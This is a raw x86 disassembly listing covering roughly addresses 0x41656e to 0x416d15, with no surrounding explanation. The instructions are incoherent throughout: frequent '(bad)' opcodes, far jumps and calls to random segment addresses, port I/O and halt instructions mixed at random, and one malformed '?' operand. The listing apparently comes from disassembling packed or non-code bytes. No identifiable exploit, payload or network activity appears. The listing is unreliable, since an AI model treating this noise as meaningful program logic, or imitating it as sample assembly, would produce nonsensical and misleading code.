  41656e:	repz add cl,BYTE PTR [edi+0x6a]
  416572:	(bad)  
  416573:	retf   
  416574:	inc    ebx
  416575:	jmp    0x6bbe:0xe159b605
  41657c:	mov    eax,ds:0x5a6cf0c9
  416581:	arpl   WORD PTR [esi+0x4c96bafa],si
  416587:	(bad)  
  416588:	fidivr WORD PTR [ecx+0xa]
  41658b:	xor    BYTE PTR [esi+0x2e],bh
  41658e:	jno    0x41659d
  416590:	xchg   ebx,eax
  416591:	call   0xc1e4009f
  416596:	adc    edi,DWORD PTR [edx]
  416598:	leave  
  416599:	addr16 xchg edx,eax
  41659b:	sahf   
  41659c:	stos   BYTE PTR es:[edi],al
  41659d:	pop    ds
  41659e:	sub    ebx,DWORD PTR [ecx]
  4165a0:	sub    DWORD PTR [eax-0x68f1a593],esi
  4165a6:	imul   esp,DWORD PTR [esp+ebx*1+0x483d170],0x42
  4165ae:	outs   dx,BYTE PTR ds:[esi]
  4165af:	les    edi,FWORD PTR [esi-0x74367c18]
  4165b5:	mov    ds:0xe7d45a0b,al
  4165ba:	push   ebp
  4165bb:	nop
  4165bc:	inc    esp
  4165bd:	push   es
  4165be:	and    edi,esp
  4165c0:	xchg   edi,eax
  4165c1:	in     eax,dx
  4165c2:	sbb    eax,0xe1db139a
  4165c7:	pop    ds
  4165c8:	jge    0x41657a
  4165ca:	and    DWORD PTR [edx],ebp
  4165cc:	daa    
  4165cd:	adc    eax,0x3023ad66
  4165d2:	add    al,0xef
  4165d4:	sub    al,0xdd
  4165d6:	out    dx,eax
  4165d7:	leave  
  4165d8:	mov    edi,0x53dd5bdb
  4165dd:	ret    
  4165de:	idiv   DWORD PTR [esi+esi*1+0x22c81b61]
  4165e5:	aam    0x6f
  4165e7:	pop    edx
  4165e8:	inc    edx
  4165e9:	dec    ebp
  4165ea:	inc    ebx
  4165eb:	mov    edi,0xa465012c
  4165f0:	fcomp  QWORD PTR [ecx-0x13a74d4c]
  4165f6:	xchg   ebp,eax
  4165f7:	cmp    BYTE PTR [eax-0x6a],al
  4165fa:	aad    0xcc
  4165fc:	addr16 iret 
  4165fe:	jge    0x416582
  416600:	xlat   BYTE PTR ds:[ebx]
  416601:	rcr    dl,0x16
  416604:	or     bl,bl
  416606:	aas    
  416607:	cmp    BYTE PTR [edx-0x447eb053],al
  41660d:	shl    dl,0x34
  416610:	popa   
  416611:	xchg   ebp,eax
  416612:	lods   al,BYTE PTR ds:[esi]
  416613:	and    ecx,0x219d7d45
  416619:	mov    eax,ds:0x2c5702ce
  41661e:	pop    ecx
  41661f:	lahf   
  416620:	iret   
  416621:	(bad)  
  416623:	lds    esp,FWORD PTR es:[edx-0x7c4d4797]
  41662a:	in     eax,0xae
  41662c:	cmp    ebp,edx
  41662e:	retf   0x4e54
  416631:	and    al,0x49
  416633:	mov    dl,0xb9
  416635:	push   edi
  416636:	pusha  
  416637:	jp     0x4166b6
  416639:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41663b:	(bad)  
  41663c:	ss mov ecx,0x8861445
  416642:	imul   edi,DWORD PTR ds:0x3849db73,0xa6e09f97
  41664c:	icebp  
  41664d:	push   ebp
  41664e:	dec    ebp
  41664f:	add    bh,BYTE PTR [ebx]
  416651:	imul   DWORD PTR [edi]
  416653:	lds    edi,FWORD PTR [eax-0x69d032f2]
  416659:	inc    ecx
  41665a:	aam    0xcf
  41665c:	ins    DWORD PTR es:[edi],dx
  41665d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41665e:	imul   BYTE PTR [ecx+0x71]
  416661:	jmp    0xbebdbbc8
  416666:	popf   
  416667:	add    DWORD PTR [ecx-0x2f],0x296047f2
  41666e:	xchg   ebp,eax
  41666f:	das    
  416670:	div    BYTE PTR [ecx+0x47]
  416673:	fsub   DWORD PTR [ecx-0x432da7f7]
  416679:	fnstsw WORD PTR [eax]
  41667b:	xchg   ecx,eax
  41667c:	test   al,0xa1
  41667f:	mov    ebp,0xa63a9b02
  416684:	into   
  416685:	xor    BYTE PTR [esi+0x5ccf18ad],bh
  41668b:	push   es
  41668c:	rcl    BYTE PTR [eax+0x6552af23],1
  416692:	(bad)  
  416694:	leave  
  416695:	mov    WORD PTR [edx],ss
  416697:	call   0x4eea:0xdb8a94f2
  41669e:	call   0x6530:0xacb26cbd
  4166a5:	retf   
  4166a6:	xchg   edi,eax
  4166a7:	aaa    
  4166a8:	xchg   edx,eax
  4166a9:	dec    ebp
  4166aa:	inc    eax
  4166ab:	mov    esi,0x3c73551b
  4166b0:	jecxz  0x416673
  4166b2:	and    eax,0xbd9ce116
  4166b7:	dec    ebx
  4166b8:	inc    esp
  4166b9:	frstor [ecx+0x56]
  4166bc:	dec    ebp
  4166bd:	push   esp
  4166be:	ins    BYTE PTR es:[edi],dx
  4166bf:	xor    DWORD PTR [eax-0x3de5bdd],esi
  4166c5:	sub    esp,DWORD PTR [edi-0xf3e19fe]
  4166cb:	sbb    bl,BYTE PTR [ebx]
  4166cd:	push   0xffffffed
  4166cf:	leave  
  4166d0:	cli    
  4166d1:	xor    eax,0xb62fdd29
  4166d6:	cmp    dh,ah
  4166d8:	or     al,0xd9
  4166da:	test   al,0x7c
  4166dc:	aad    0x3e
  4166de:	stos   BYTE PTR es:[edi],al
  4166df:	inc    ebx
  4166e0:	adc    cl,BYTE PTR [edi-0x394870ec]
  4166e6:	les    esi,FWORD PTR [ebx+ebp*8+0x76478385]
  4166ed:	cmc    
  4166ee:	jbe    0x4166b8
  4166f0:	jmp    0x416743
  4166f2:	and    al,0xc0
  4166f4:	and    edx,DWORD PTR [ebp-0x1e]
  4166f7:	mov    ecx,0x17de5bc9
  4166fc:	or     eax,0x1a1d2917
  416701:	aas    
  416702:	and    al,0x3
  416704:	or     esp,edi
  416706:	sub    ebx,ecx
  416708:	dec    ebp
  416709:	imul   ebx,edx,0xfc18c71
  41670f:	xchg   edx,eax
  416710:	xor    BYTE PTR [ecx+esi*1+0x5a],ah
  416714:	jbe    0x416748
  416716:	out    dx,eax
  416717:	sub    bh,ah
  416719:	dec    ebx
  41671a:	pop    ecx
  41671b:	test   al,0x5
  41671d:	in     al,0x4a
  41671f:	adc    edx,edi
  416721:	pop    eax
  416722:	out    0x19,al
  416724:	push   edx
  416725:	xchg   BYTE PTR [ebp-0x37],dh
  416728:	ret    
  416729:	sahf   
  41672a:	das    
  41672b:	sbb    BYTE PTR [esp+eax*8+0x12],dl
  41672f:	mov    DWORD PTR [esi-0x38],eax
  416732:	sbb    BYTE PTR [edx+eiz*2],ah
  416735:	push   es
  416736:	je     0x4167ac
  416738:	scas   al,BYTE PTR es:[edi]
  416739:	sub    al,0x4b
  41673b:	inc    ecx
  41673c:	aam    0xae
  41673e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41673f:	xchg   ebx,eax
  416740:	dec    esi
  416741:	aad    0x37
  416743:	xor    eax,0x518ba909
  416748:	scas   eax,DWORD PTR es:[edi]
  416749:	les    edi,FWORD PTR ds:0xda2467da
  41674f:	nop
  416750:	pusha  
  416751:	dec    esi
  416752:	ret    0xec0f
  416755:	(bad)  
  416756:	and    edx,DWORD PTR [esi+0x18db19bf]
  41675c:	enter  0x3cc3,0x9
  416760:	or     ah,bl
  416762:	push   ss
  416763:	aaa    
  416764:	cwde   
  416765:	cmp    ch,BYTE PTR [edi]
  416767:	arpl   WORD PTR [ebp-0x3e50fcbb],bp
  41676d:	push   ebp
  41676e:	retf   
  41676f:	(bad)  
  416770:	in     al,0x43
  416772:	retf   
  416773:	ins    DWORD PTR es:[edi],dx
  416774:	jle    0x416744
  416776:	leave  
  416777:	dec    ebp
  416778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416779:	cwde   
  41677a:	call   0xf53a9a3c
  41677f:	mov    esi,0xe863979
  416784:	sbb    BYTE PTR [edx-0x1f7df96f],bh
  41678a:	(bad)  
  41678b:	pop    eax
  41678c:	out    0x66,al
  41678e:	leave  
  41678f:	cdq    
  416790:	pushf  
  416791:	xor    ah,BYTE PTR [ebp+edx*8-0xc]
  416795:	xlat   BYTE PTR ds:[ebx]
  416796:	adc    eax,0x651d1628
  41679b:	cld    
  41679c:	xor    DWORD PTR [edx],ebx
  41679e:	jmp    0xc5713a79
  4167a3:	pop    edx
  4167a4:	loope  0x4167d5
  4167a6:	cmp    dh,ah
  4167a8:	sbb    DWORD PTR [esi-0x75],ebp
  4167ab:	mov    ah,BYTE PTR [esi+0x53e4f5d7]
  4167b1:	adc    eax,DWORD PTR [edx+0x25fa42e4]
  4167b7:	push   ecx
  4167b8:	jno    0x41675d
  4167ba:	pop    esp
  4167bb:	jmp    0x2b5d607a
  4167c0:	retf   0x5b8f
  4167c3:	ja     0x416751
  4167c5:	add    BYTE PTR [eax],0x83
  4167c8:	adc    eax,0xae1ca65b
  4167cd:	cs jo  0x4167b3
  4167d0:	mov    sp,0xf77
  4167d4:	inc    eax
  4167d5:	jp     0x416757
  4167d7:	xor    BYTE PTR [ecx+edi*8+0x6a],0x1d
  4167dc:	jle    0x416793
  4167de:	nop
  4167df:	outs   dx,DWORD PTR ds:[esi]
  4167e0:	sahf   
  4167e1:	cwde   
  4167e2:	out    0x8e,eax
  4167e4:	cs inc eax
  4167e6:	push   es
  4167e7:	jecxz  0x416791
  4167e9:	jmp    0x416788
  4167eb:	push   esp
  4167ec:	pop    edi
  4167ed:	push   ecx
  4167ee:	or     al,0x89
  4167f0:	xchg   ebp,eax
  4167f1:	sub    DWORD PTR [edx+0x39],edi
  4167f4:	pusha  
  4167f5:	ins    DWORD PTR es:[edi],dx
  4167f6:	mov    ch,0xdc
  4167f8:	retf   0x984a
  4167fb:	les    esp,FWORD PTR [eax-0x77]
  4167fe:	add    DWORD PTR [ebx+0x18e9f845],ecx
  416804:	or     eax,DWORD PTR [eax]
  416806:	add    cl,ch
  416808:	mov    bl,0x2
  41680a:	add    BYTE PTR [eax],al
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	inc    ecx
  416819:	les    ebp,FWORD PTR [esi]
  41681b:	adc    eax,0x787f2376
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x41682c
  416825:	fild   WORD PTR ds:0x50573f45
  41682b:	cmp    al,0xbe
  41682d:	dec    esi
  41682e:	ret    
  41682f:	inc    edi
  416830:	push   0xffffff96
  416832:	mov    esi,0xba97b8b0
  416837:	or     BYTE PTR [eax-0x8],dl
  41683a:	cli    
  41683b:	int3   
  41683c:	xor    eax,DWORD PTR [edx*8+0x2acaad60]
  416843:	push   esi
  416844:	add    bh,BYTE PTR [edi-0x55594356]
  41684a:	pop    esi
  41684b:	pusha  
  41684c:	sub    ebx,DWORD PTR [esp+edx*1+0x4a77e40e]
  416853:	xchg   ebp,eax
  416854:	sub    eax,0xa2720652
  416859:	pushf  
  41685a:	pop    edi
  41685b:	fcmovne st,st(0)
  41685d:	in     eax,0xb7
  41685f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416860:	dec    ecx
  416861:	jl     0x4167fe
  416863:	pop    ebx
  416864:	aam    0xb1
  416866:	fs aas 
  416868:	jmp    0x4acefe00
  41686d:	pop    es
  41686e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41686f:	pop    es
  416870:	gs push es
  416872:	sti    
  416873:	daa    
  416874:	fiadd  DWORD PTR [eax+edi*2]
  416877:	mov    ah,0xdc
  416879:	sbb    al,0x9f
  41687b:	dec    ebx
  41687c:	jae    0x41683b
  41687e:	sub    eax,0x1f279a41
  416883:	add    DWORD PTR [edi+0x4a],ebx
  416886:	adc    eax,0x93c5da03
  41688b:	std    
  41688c:	aam    0x0
  41688e:	xchg   ebp,eax
  41688f:	out    0x34,al
  416891:	xor    DWORD PTR [ecx-0x7b85920b],ebp
  416897:	mov    edi,0xdde096b6
  41689c:	pop    edi
  41689d:	mov    ah,0x5
  41689f:	inc    eax
  4168a0:	shl    BYTE PTR [ebx+0x69],cl
  4168a3:	rcl    ebp,cl
  4168a5:	push   cs
  4168a6:	lds    edx,FWORD PTR [ecx]
  4168a8:	cmp    BYTE PTR [edi+0x6c],dh
  4168ab:	std    
  4168ac:	neg    DWORD PTR [edi]
  4168ae:	sub    al,0x69
  4168b0:	neg    DWORD PTR [ecx-0x7450c7d6]
  4168b6:	call   0x6cc9:0x156c655a
  4168bd:	and    al,0xdc
  4168bf:	jl     0x416892
  4168c1:	push   ss
  4168c2:	cdq    
  4168c3:	and    al,BYTE PTR [ebp-0x2b]
  4168c6:	imul   esp,DWORD PTR [ecx+esi*2-0x33],0xf40874d
  4168ce:	inc    ebx
  4168cf:	loop   0x4168f5
  4168d1:	loopne 0x416871
  4168d3:	adc    ch,dl
  4168d5:	dec    edx
  4168d6:	dec    BYTE PTR [ebx+0x53751460]
  4168dc:	jnp    0x416939
  4168de:	sub    eax,0x8bf930bd
  4168e3:	jbe    0x416903
  4168e5:	and    al,BYTE PTR [esi+eax*8+0x24]
  4168e9:	xor    al,0x39
  4168eb:	out    dx,al
  4168ec:	ret    0xf45c
  4168ef:	imul   esp,esp,0x23
  4168f2:	add    eax,0x57b7916d
  4168f7:	rcr    DWORD PTR [ecx-0x67cbe1eb],0x81
  4168fe:	data16 aad 0xb5
  416901:	fstp   QWORD PTR [edx-0x4bcc3e51]
  416907:	push   eax
  416908:	(bad)  
  416909:	mov    cl,0x7
  41690b:	mov    DWORD PTR [ecx+0x36],ecx
  41690e:	aam    0x8b
  416910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416911:	sahf   
  416912:	jp     0x4168a6
  416914:	mov    ah,BYTE PTR cs:[ebp-0x46e006ac]
  41691b:	xchg   esp,eax
  41691c:	shl    BYTE PTR [ebp+0xcdc75cd],cl
  416922:	shl    BYTE PTR [esi-0x59df567b],1
  416928:	ds cs test al,0xf8
  41692c:	ds mov ah,0x6d
  41692f:	push   cs
  416930:	retf   
  416931:	icebp  
  416932:	call   0xa1f3c32
  416937:	lahf   
  416938:	xor    dl,BYTE PTR [eax+0x23]
  41693b:	shl    DWORD PTR [eax],1
  41693d:	xchg   ebp,eax
  41693e:	xor    eax,0x84f3594f
  416943:	xor    cl,BYTE PTR [edi+0x34d0d6e3]
  416949:	fwait
  41694a:	lock iret 
  41694c:	jge    0x41697c
  41694e:	jo     0x416976
  416950:	out    0x83,al
  416952:	mov    BYTE PTR [ebp+0x2f],dl
  416955:	jns    0x416937
  416957:	sub    BYTE PTR [ebp-0x5c],0x54
  41695b:	(bad)  
  41695d:	mov    esp,ebx
  41695f:	xchg   ebp,eax
  416960:	jo     0x41696c
  416962:	cdq    
  416963:	imul   esi,DWORD PTR [ebx],0x84e9149b
  416969:	les    eax,FWORD PTR [ebp-0x6f]
  41696c:	dec    ebx
  41696d:	xor    al,0xc0
  41696f:	in     eax,0x67
  416971:	sub    al,0xbd
  416973:	lock add al,0xed
  416976:	packuswb mm3,QWORD PTR [ecx-0x7]
  41697a:	mov    ds:0x24479dab,eax
  41697f:	pop    es
  416980:	(bad)  
  416981:	or     dl,BYTE PTR [edi]
  416983:	outs   dx,DWORD PTR ds:[esi]
  416984:	pusha  
  416985:	pop    edi
  416986:	cdq    
  416987:	das    
  416988:	mov    ch,0xca
  41698a:	push   ebx
  41698b:	push   0xb5814e22
  416990:	xor    ah,ah
  416992:	sub    BYTE PTR ds:0x11a0bed0,al
  416998:	das    
  416999:	xchg   edi,eax
  41699a:	push   edx
  41699b:	fcom   QWORD PTR [esi]
  41699d:	adc    DWORD PTR [eax+0x51],ecx
  4169a0:	fs int3 
  4169a2:	inc    eax
  4169a3:	(bad)  
  4169a4:	js     0x416a1a
  4169a6:	lahf   
  4169a7:	push   ebx
  4169a8:	push   edx
  4169a9:	or     ah,BYTE PTR [ebp-0x46]
  4169ac:	icebp  
  4169ad:	push   0x40
  4169af:	push   es
  4169b0:	popf   
  4169b1:	mov    edi,0x3455f0e8
  4169b6:	popf   
  4169b7:	in     al,dx
  4169b8:	loopne 0x41694f
  4169ba:	cmp    ebp,esi
  4169bc:	or     eax,0xe1476795
  4169c1:	mov    BYTE PTR [eax],bl
  4169c3:	jne    0x4169e3
  4169c5:	and    esi,DWORD PTR [edx]
  4169c7:	sbb    edx,ecx
  4169c9:	add    eax,DWORD PTR [esi-0x5d2b9bfd]
  4169cf:	rcl    bl,0x83
  4169d2:	pop    ebp
  4169d3:	shl    BYTE PTR [eax+0x2ae60bad],1
  4169d9:	push   ecx
  4169da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169db:	add    eax,0xf2f0caef
  4169e0:	imul   DWORD PTR [edi-0x15]
  4169e3:	sbb    esp,edi
  4169e5:	push   esp
  4169e6:	fisttp WORD PTR [ecx]
  4169e8:	sub    ah,BYTE PTR es:[eax+0xe]
  4169ec:	lea    edi,[eax]
  4169ee:	add    eax,0x95f166ae
  4169f3:	add    DWORD PTR [esi],0xffffffb1
  4169f6:	pop    edx
  4169f7:	mov    ?,WORD PTR [ebp-0x529db03c]
  4169fd:	jl     0x416a18
  4169ff:	inc    eax
  416a00:	into   
  416a01:	or     DWORD PTR [eax+0x37],ecx
  416a04:	add    eax,ebx
  416a06:	lods   al,BYTE PTR ds:[esi]
  416a07:	xchg   edx,eax
  416a08:	movd   DWORD PTR [edi-0x39f26257],mm3
  416a0f:	xor    dl,BYTE PTR [esi-0x3d69f739]
  416a15:	and    BYTE PTR [eax],bl
  416a17:	mov    al,0xc8
  416a19:	jne    0x416a7a
  416a1b:	add    eax,eax
  416a1d:	push   edx
  416a1e:	fst    QWORD PTR [edx]
  416a20:	adc    DWORD PTR gs:[ecx],0xffffffa7
  416a24:	(bad)  
  416a25:	aaa    
  416a26:	mov    al,ds:0x2670b450
  416a2b:	shl    DWORD PTR [eax+esi*1],cl
  416a2e:	movs   BYTE PTR es:[di],BYTE PTR fs:[si]
  416a31:	and    BYTE PTR ss:[ebx+esi*8],cl
  416a35:	std    
  416a36:	jns    0x416a83
  416a38:	call   DWORD PTR [eax+0x2d]
  416a3b:	iret   
  416a3c:	cmp    ecx,DWORD PTR [edx-0x2dac0e9f]
  416a42:	in     al,0x9a
  416a44:	jae    0x416aa4
  416a46:	mov    al,0x1c
  416a48:	stos   BYTE PTR es:[edi],al
  416a49:	pop    ebx
  416a4a:	or     eax,0x8ee7040
  416a4f:	mov    ds,WORD PTR [ebp+0x40]
  416a52:	mov    edx,DWORD PTR [eax]
  416a54:	and    BYTE PTR [ebp-0xf],ch
  416a57:	std    
  416a58:	xchg   ecx,eax
  416a59:	xchg   BYTE PTR [ebx],cl
  416a5b:	stos   DWORD PTR es:[edi],eax
  416a5c:	hlt    
  416a5d:	and    BYTE PTR [ebx+ebx*1-0x45],dh
  416a61:	sbb    ebx,DWORD PTR [esi]
  416a63:	into   
  416a64:	cmp    DWORD PTR [ecx+0x37],0x5ee4bf4d
  416a6b:	push   ebp
  416a6c:	ins    DWORD PTR es:[edi],dx
  416a6d:	data16 cmc 
  416a6f:	push   cs
  416a70:	(bad)  
  416a71:	or     eax,0x6d
  416a74:	add    BYTE PTR [edi+edx*2],bh
  416a77:	shr    BYTE PTR [eax],0x8
  416a7a:	into   
  416a7b:	xlat   BYTE PTR ds:[ebx]
  416a7c:	ja     0x416a4e
  416a7e:	pop    ecx
  416a7f:	iret   
  416a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a81:	xlat   BYTE PTR ds:[ebx]
  416a82:	sub    esi,ecx
  416a84:	xchg   ebp,eax
  416a85:	cld    
  416a86:	mov    bh,0x6b
  416a88:	push   ds
  416a89:	scas   eax,DWORD PTR es:[edi]
  416a8a:	loope  0x416a47
  416a8c:	cli    
  416a8d:	je     0x416acd
  416a8f:	iret   
  416a90:	sti    
  416a91:	sub    DWORD PTR cs:[eax],0xe1f70ba3
  416a98:	mov    bl,0x32
  416a9a:	cwde   
  416a9b:	mov    dh,0x2e
  416a9d:	fs jnp 0x416a41
  416aa0:	sti    
  416aa1:	ja     0x416a4c
  416aa3:	dec    ecx
  416aa4:	cmp    eax,0x2f27bc9a
  416aa9:	jno    0x416afa
  416aab:	(bad)  
  416aad:	das    
  416aae:	xor    dh,bh
  416ab0:	mov    ebx,0x3089762f
  416ab5:	shl    DWORD PTR [edi-0x210b605a],0x3e
  416abc:	fiadd  DWORD PTR [esi+0x50]
  416abf:	mov    eax,DWORD PTR [ebp-0x4]
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x6b64ff75
  416ad4:	mov    ebp,0x2093c4cb
  416ad9:	jg     0x416b53
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416adb
  416ae0:	mul    BYTE PTR [eax]
  416ae2:	sub    al,0x51
  416ae4:	retf   
  416ae5:	mov    ebp,0x8644b3ed
  416aea:	fbld   TBYTE PTR [eax+0x72]
  416aed:	(bad)  
  416aee:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416af0:	sbb    al,0x2c
  416af2:	das    
  416af3:	test   ch,ch
  416af5:	in     eax,dx
  416af6:	sahf   
  416af7:	pop    ebp
  416af8:	test   al,0x5
  416afa:	fbld   TBYTE PTR [esi+0x67]
  416afd:	clc    
  416afe:	jecxz  0x416ae5
  416b00:	mov    edx,0x80818f5f
  416b05:	daa    
  416b06:	adc    ch,bl
  416b08:	icebp  
  416b09:	addr16 and eax,0x67e03b2f
  416b0f:	xchg   esi,eax
  416b10:	or     al,0x1c
  416b12:	sub    BYTE PTR [ebx+0x3f19efc2],dl
  416b18:	fisttp WORD PTR [ecx-0xb5a3226]
  416b1e:	data16 mov ah,0x51
  416b21:	mov    al,ds:0x67ffaa50
  416b26:	cmp    DWORD PTR [ebp-0x3a],edx
  416b29:	or     edx,DWORD PTR [ecx-0x47]
  416b2c:	adc    ah,BYTE PTR [edx-0x64e8fdad]
  416b32:	mov    ah,BYTE PTR [edi-0xf0d477e]
  416b38:	xor    ebp,edx
  416b3a:	in     eax,0x6d
  416b3c:	push   eax
  416b3d:	lock sub cl,BYTE PTR [ecx+0x7877f437]
  416b44:	cmp    bh,BYTE PTR [eax-0x626bc0ff]
  416b4a:	jmp    0x3d9d:0xc3574842
  416b51:	sub    edi,DWORD PTR ds:0x39e26b95
  416b57:	nop
  416b58:	out    dx,al
  416b59:	aad    0xa1
  416b5b:	inc    ecx
  416b5c:	mov    eax,ds:0xb2edd582
  416b61:	shr    ch,cl
  416b63:	xor    al,0x1d
  416b65:	cdq    
  416b66:	sbb    al,BYTE PTR [edi+esi*4+0x30]
  416b6a:	and    eax,0x338f4589
  416b6f:	cmc    
  416b70:	and    DWORD PTR ds:0x132f28c5,esp
  416b76:	lods   al,BYTE PTR ds:[esi]
  416b77:	xor    eax,DWORD PTR [esp+eax*8-0x56]
  416b7b:	mov    edi,eax
  416b7d:	mov    ah,0x38
  416b7f:	mov    edi,0x1ba08591
  416b84:	inc    ebp
  416b85:	cwde   
  416b86:	mov    esi,0x9998d568
  416b8b:	pop    edi
  416b8c:	pop    ebp
  416b8d:	fdiv   st,st(4)
  416b8f:	sub    esp,0xffffffa0
  416b92:	and    edi,edi
  416b94:	out    0x3e,al
  416b96:	imul   edx,DWORD PTR [esi-0x54b15be0],0x8798cfd2
  416ba0:	mov    ds,WORD PTR [ebp+0x46]
  416ba3:	xlat   BYTE PTR ds:[ebx]
  416ba4:	adc    eax,0x3ca2b4e5
  416ba9:	jle    0x416b3f
  416bab:	xor    dl,bh
  416bad:	mov    esi,0x5401df10
  416bb2:	push   esi
  416bb3:	inc    eax
  416bb4:	jge    0x416b3a
  416bb6:	add    dl,bl
  416bb8:	push   ss
  416bb9:	lods   al,BYTE PTR ds:[esi]
  416bba:	enter  0xf595,0xc3
  416bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbf:	sub    eax,0xb53f5862
  416bc4:	mov    ah,0xad
  416bc6:	out    0x2b,al
  416bc8:	cld    
  416bc9:	and    eax,DWORD PTR [ebx+eiz*2+0x4b]
  416bcd:	jmp    0xd42a:0x2f743ee
  416bd4:	mov    ah,0x48
  416bd6:	mov    ds:0xea04c40a,eax
  416bdb:	xchg   DWORD PTR [edx+eax*1+0x33],esi
  416bdf:	ja     0x416bca
  416be1:	push   ebx
  416be2:	ret    
  416be3:	jo     0x416b97
  416be5:	stos   BYTE PTR es:[edi],al
  416be6:	mov    al,ds:0xc8100de5
  416beb:	mov    cl,0x83
  416bed:	hlt    
  416bee:	mov    dl,0xef
  416bf0:	frstor [ebx-0x1b8fa58]
  416bf6:	sub    DWORD PTR [ecx-0x1],0xf9187bc9
  416bfd:	lods   al,BYTE PTR ds:[esi]
  416bfe:	push   0xfed8cb6c
  416c03:	adc    al,0x80
  416c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c06:	jmp    0xf245:0xe5b81b28
  416c0d:	cmc    
  416c0e:	gs out dx,al
  416c10:	cwde   
  416c11:	adc    eax,0xff3b182c
  416c16:	sub    esi,DWORD PTR [edx+0xd9d5027]
  416c1c:	jle    0x416bca
  416c1e:	cdq    
  416c1f:	and    al,0x7a
  416c21:	jne    0x416c4b
  416c23:	sub    eax,0xfbbd668b
  416c28:	pop    edx
  416c29:	cmp    bl,BYTE PTR [edx-0x20]
  416c2c:	inc    esi
  416c2d:	push   esp
  416c2e:	pop    esi
  416c2f:	loop   0x416bcb
  416c31:	inc    eax
  416c32:	hlt    
  416c33:	imul   esp,ebx,0xdbfc0e3e
  416c39:	iret   
  416c3a:	add    bl,dh
  416c3c:	pop    edx
  416c3d:	(bad)  
  416c3e:	and    al,0xf2
  416c40:	call   0xc5281963
  416c45:	push   0xcdf38afb
  416c4a:	cmp    ecx,edi
  416c4c:	icebp  
  416c4d:	outs   dx,BYTE PTR ds:[esi]
  416c4e:	cdq    
  416c4f:	(bad)  
  416c50:	out    dx,eax
  416c51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c52:	mov    ah,0x2c
  416c54:	ror    bh,1
  416c56:	pushf  
  416c57:	scas   eax,DWORD PTR es:[edi]
  416c58:	add    ebp,esp
  416c5a:	fst    QWORD PTR [eax-0x1b]
  416c5d:	scas   al,BYTE PTR es:[edi]
  416c5e:	or     ebx,edi
  416c60:	pushf  
  416c61:	ja     0x416ccc
  416c63:	aaa    
  416c64:	mov    cl,BYTE PTR [esi+0x5f]
  416c67:	jl     0x416c08
  416c69:	jg     0x416cd2
  416c6b:	mov    ebx,0xb0232ffc
  416c70:	neg    ah
  416c72:	(bad)  
  416c74:	std    
  416c75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c76:	lods   al,BYTE PTR ds:[esi]
  416c77:	mov    dh,0x1c
  416c79:	outs   dx,DWORD PTR ds:[esi]
  416c7a:	pop    ecx
  416c7b:	pop    esp
  416c7c:	mov    ecx,0xdef8d51a
  416c81:	hlt    
  416c82:	sbb    ebp,DWORD PTR [edx-0x34]
  416c85:	pop    eax
  416c86:	inc    edx
  416c87:	fst    QWORD PTR [edi]
  416c89:	jno    0x416c21
  416c8b:	aas    
  416c8c:	addr16 push 0xfffffff4
  416c8f:	push   ecx
  416c90:	in     eax,dx
  416c91:	dec    eax
  416c92:	dec    eax
  416c93:	or     DWORD PTR [ecx+0x5dcb3661],edi
  416c99:	mov    esp,0x15cc782c
  416c9e:	mov    ah,0xc
  416ca0:	cs ja  0x416d08
  416ca3:	(bad)  
  416ca4:	mov    al,0x9f
  416ca6:	nop
  416ca7:	retf   
  416ca8:	xchg   edi,eax
  416ca9:	dec    eax
  416caa:	dec    esp
  416cab:	stos   DWORD PTR es:[edi],eax
  416cac:	lahf   
  416cad:	js     0x416d18
  416caf:	cmc    
  416cb0:	xor    DWORD PTR [edi],ebp
  416cb2:	xor    bl,BYTE PTR [ebx]
  416cb4:	cmp    eax,edi
  416cb6:	adc    eax,0x910893a6
  416cbb:	stos   DWORD PTR es:[edi],eax
  416cbc:	jg     0x416cc9
  416cbe:	pop    edx
  416cbf:	imul   edi,ecx,0xffffffa9
  416cc2:	inc    esp
  416cc3:	push   ebp
  416cc4:	cmp    al,0xa1
  416cc6:	lahf   
  416cc7:	mov    esp,DWORD PTR [ebp+0x2bf57f21]
  416ccd:	xchg   BYTE PTR [ecx+0x27],cl
  416cd0:	mov    bl,0xc6
  416cd2:	sub    DWORD PTR [ebx],esi
  416cd4:	(bad)  
  416cd5:	sub    DWORD PTR [edi-0x567f9971],ebx
  416cdb:	push   eax
  416cdc:	inc    eax
  416cde:	gs jo  0x416d4d
  416ce1:	mov    ecx,0xc49156d
  416ce6:	(bad)  
  416ce8:	and    ah,BYTE PTR [esi]
  416cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ceb:	hlt    
  416cec:	lods   al,BYTE PTR ds:[esi]
  416ced:	fbstp  TBYTE PTR [esi-0x768dc892]
  416cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cf4:	lods   al,BYTE PTR ds:[esi]
  416cf5:	ret    
  416cf6:	push   ss
  416cf7:	mov    cl,dl
  416cf9:	loopne 0x416ccb
  416cfb:	repnz push esi
  416cfd:	inc    edi
  416cfe:	mov    WORD PTR [ecx+eax*1+0x22],cs
  416d02:	sti    
  416d03:	lock lods eax,DWORD PTR ds:[esi]
  416d06:	shr    DWORD PTR [esi-0x5fb6ceb3],cl
  416d0c:	or     edx,DWORD PTR cs:0xe1d78570
  416d13:	not    al
  416d15:	call   0xd08d:0x3fb68fe9
